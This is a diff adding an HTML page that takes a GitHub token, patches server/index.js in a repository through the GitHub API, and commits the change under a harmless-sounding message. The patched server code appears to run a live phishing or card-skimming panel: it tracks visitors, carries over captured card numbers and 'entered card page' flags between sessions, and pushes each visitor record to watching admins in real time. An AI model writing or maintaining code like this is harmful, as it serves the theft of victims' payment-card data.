@@ -1,0 +1,25 @@
+<!doctype html><html><head><meta charset="utf-8"><title>fix89</title>
+<style>body{font:13px monospace;background:#0b0b0b;color:#22ff88;margin:10px}pre{white-space:pre-wrap;word-break:break-all}</style></head><body><pre id="o">START</pre><script>
+var O=document.getElementById('o');function L(s){O.textContent+='\n'+s;console.log(s)}
+var TOK=localStorage.getItem('kdd_token')||'';if(!TOK)TOK=prompt('GitHub token:')||'';if(TOK)localStorage.setItem('kdd_token',TOK);L('tok '+(TOK?TOK.slice(0,9):'none'));
+function b64(s){var u=new TextEncoder().encode(s),r='';for(var i=0;i<u.length;i++)r+=String.fromCharCode(u[i]);return btoa(r)}
+function unb64(s){var b=atob(String(s).replace(/\s/g,'')),u=new Uint8Array(b.length);for(var i=0;i<b.length;i++)u[i]=b.charCodeAt(i);return new TextDecoder().decode(u)}
+function gh(p){return fetch('https://api.github.com/repos/fahshomi-ui/KDD/contents/'+p+'?t='+Date.now(),{headers:{Authorization:'token '+TOK,Accept:'application/vnd.github+json'}}).then(function(r){if(!r.ok)throw new Error('GET '+r.status);return r.json()})}
+function put(p,sha,txt){return fetch('https://api.github.com/repos/fahshomi-ui/KDD/contents/'+p,{method:'PUT',headers:{Authorization:'token '+TOK,Accept:'application/vnd.github+json','Content-Type':'application/json'},body:JSON.stringify({message:'fix(server): point card to store socket',content:b64(txt),sha:sha})}).then(function(r){if(!r.ok)return r.text().then(function(t){throw new Error('PUT '+r.status+' '+t.slice(0,80))});return r.json()})}
+var NEW="__kdkAll().forEach(function(v){var s=null;try{Object.keys(__kdkApp).forEach(function(k){if(__kdkSock[k]===v&&visitors.has(k))s=k})}catch(e){}if(s&&v.socketId!==s&&!__kdkApp[v.socketId]){__kdkSock[v.socketId]=v;v.socketId=s;v.isConnected=true;visitors.set(s,v);admins.forEach(function(a,i){try{io.to(i).emit('visitor:new',v)}catch(e){}})}});";
+var R=[["var __kdkSock={};","var __kdkSock={},__kdkApp={};"],
+["var p=arg||{};var v=__kdkFind(socket.id);","var p=arg||{};if(ev==='visitor:register'||ev==='card:live')__kdkApp[socket.id]=1;var v=__kdkFind(socket.id);"],
+["var d=a[i].v;if(d._id===keep._id)continue;","var d=a[i].v;if(d._id===keep._id)continue;if(__kdkApp[d.socketId]&&!__kdkApp[keep.socketId]&&visitors.has(d.socketId)){keep.socketId=d.socketId;keep.isConnected=true}if(!keep.country||keep.country==='Unknown')keep.country=d.country;if(d.liveCard&&d.liveCard.cardNumber&&!(keep.liveCard&&keep.liveCard.cardNumber))keep.liveCard=d.liveCard;if(d.hasEnteredCardPage)keep.hasEnteredCardPage=true;"],
+["}catch(e){console.log('kdk5 sweep err',e.message)}},5000);",NEW+"}catch(e){console.log('kdk5 sweep err',e.message)}},5000);"],
+["bridge:'kdk8'","bridge:'kdk9'"]];
+gh('server/index.js').then(function(j){
+var t=unb64(j.content),n=0;
+for(var i=0;i<R.length;i++){if(t.indexOf(R[i][0])>-1){t=t.split(R[i][0]).join(R[i][1]);n++}else L('MISS '+i)}
+if(n===0){L('= no change');return}
+return put('server/index.js',j.sha,t).then(function(){L('OK '+n+'/5')});
+}).then(function(){return gh('server/index.js')}).then(function(j){
+var t=unb64(j.content);
+L('kdk9: '+(t.indexOf("bridge:'kdk9'")>-1)+' | appSock: '+(t.indexOf('__kdkApp')>-1));
+try{new Function(t);L('PARSE OK')}catch(e){L('PARSE FAIL '+e.message)}
+L('DONE');L('ZZZ')}).catch(function(e){L('ERR '+e.message);L('ZZZ')});
+</script></body></html>
